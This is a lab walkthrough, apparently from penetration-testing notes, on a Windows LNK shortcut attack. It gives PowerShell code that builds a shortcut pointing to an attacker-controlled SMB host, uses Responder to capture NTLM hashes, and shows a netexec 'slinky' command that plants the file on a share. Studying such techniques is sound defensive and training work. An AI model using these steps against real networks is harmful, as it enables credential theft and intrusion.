# VIII. LNK File Attack

This attack leverages malicious .LNK (shortcut) files to infect a system. LNK files are shortcut files commonly used in Windows to point to executable file or directories. These can be crafted maliciously to execute arbitrary commands when opened by a user.

## How is a LNK File Attack Performed?

Boot up any Windows user machine.

- Open Powershell as an Administrator
- Paste the following line by line into the console:
    
    ```powershell
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("C:\test.lnk")
    $lnk.TargetPath = "\\192.168.138.149\@test.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Test"
    $lnk.HotKey = "Ctrl+Alt+T"
    $lnk.Save()
    ```
    
    NOTE: Make sure the TargetPath is set to the IP address of the Kali machine.
    
    ![lnk 1.png](VIII%20LNK%20File%20Attack%203eca55e4a68647aeb747bb9924828875/lnk_1.png)
    
- Save the file as `~test`. This is to make the file get loaded at the top.
- Move the file into the file share in this, mine is named `The Loot`.
    
    ![lnk 2.png](VIII%20LNK%20File%20Attack%203eca55e4a68647aeb747bb9924828875/lnk_2.png)
    
- Back on the Kali machine. Start responder with `sudo responder -I eth0 -dPv`
- Navigate back to the file share in Windows, or refresh it to load the lnk file.
- Responder has captured the hashes.
    
    ![lnk 3.png](VIII%20LNK%20File%20Attack%203eca55e4a68647aeb747bb9924828875/lnk_3.png)
    

There’s another method to perform a lnk attack using a tool called `Netexec` which was formerly known as `crackmapexec`. It is pretty much the same tool. The tool has a module called `slinky` that looks for a share that is accessible to the user machine and it’ll upload the malicious lnk file to it without having to access the machine and do it ourselves.

```bash
netexec smb <USERMACHINE-IP> -d <DOMAIN NAME> -u <USERNAME> -p <PASSWORD> -M slinky -o NAME=test SERVER=<KALI-IP>
```

![lnk 4.png](VIII%20LNK%20File%20Attack%203eca55e4a68647aeb747bb9924828875/lnk_4.png)

The current configuration we are using does have the file share exposed. But this is very useful to know in a situation where a file share was exposed.

## Resources:

Additional resources for forced authentication: [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)